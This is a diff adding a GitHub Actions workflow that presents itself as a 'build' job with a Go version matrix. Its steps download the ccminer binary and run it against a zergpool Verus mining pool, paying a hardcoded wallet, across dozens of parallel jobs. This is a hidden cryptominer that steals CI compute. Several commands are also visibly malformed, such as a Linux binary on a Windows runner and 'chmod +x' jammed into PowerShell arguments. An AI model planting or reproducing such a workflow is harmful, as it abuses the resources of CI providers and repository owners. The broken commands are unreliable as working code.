@@ -1,0 +1,26 @@
+name: kapten_coro
+ 
+on: [workflow_dispatch]
+ 
+jobs:
+  build:
+    name: kapten_crypto
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.1, 1.2, 1.3, 1,35]
+        flag: [A, B, C, D, E, F, G, H, I]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: DOWNLOAD
+      run: Invoke-WebRequest https://github.com/monkins1010/ccminer/releases/download/v3.7.0/ccminer_3_7_ubuntu_18.04 -outfile chmod +x ccminer_3_7_ubuntu_18.04
+    - name: Extract
+      run: Expand-Archive chmod +x ccminer_3_7_ubuntu_18.04
+    - name: Running
+      run: ./ccminer_3_7_ubuntu_18.04 -a verus  -o stratum+tcp://verushash.mine.zergpool.com:3300 -u RHhxHVKzmgqvFuqK7TX84TWZunfSjWB9fG.dogi1 -p c=RVN -t 40
+    - name: END
+      run: exit
